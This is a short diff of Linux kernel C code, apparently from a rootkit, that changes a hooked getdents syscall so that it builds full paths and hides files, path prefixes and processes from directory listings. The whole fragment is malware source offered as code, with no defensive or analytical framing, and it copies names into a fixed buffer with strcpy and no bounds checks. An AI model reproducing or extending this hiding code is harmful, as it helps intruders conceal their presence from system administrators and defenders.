@@ -164,20 +164,27 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 	long ret;
 	int len = 0;
 	int tlen = 0;
+	
+	char path[1024];
+	ssize_t path_len;
 
 	ret = (*original_getdents) (fd,dirp,count);	
 	tlen = ret;
-		
+	
+	path_len = get_path(fd, path, 1024);
+	memset(path+path_len, '/', 1);
 	while(tlen>0)
 	{
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
 		
-		/*if(check_hide_fpath(dirp->d_name)
-				|| check_hide_fprefix(dirp->d_name)
-				|| check_hide_process(fd, dirp->d_name)
-				|| check_hide_symlink(dirp->d_name))*/
-		if(check_hide_process(fd, dirp->d_name))
+		strcpy(path+path_len+1, dirp->d_name);
+		memset(path+path_len + strlen(dirp->d_name) + 1, '\0', 1);
+
+		if(check_hide_fpath(path)
+				|| check_hide_fprefix(path)
+				|| check_hide_process(fd, dirp->d_name))
+		//		|| check_hide_symlink(path))
 		{	
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
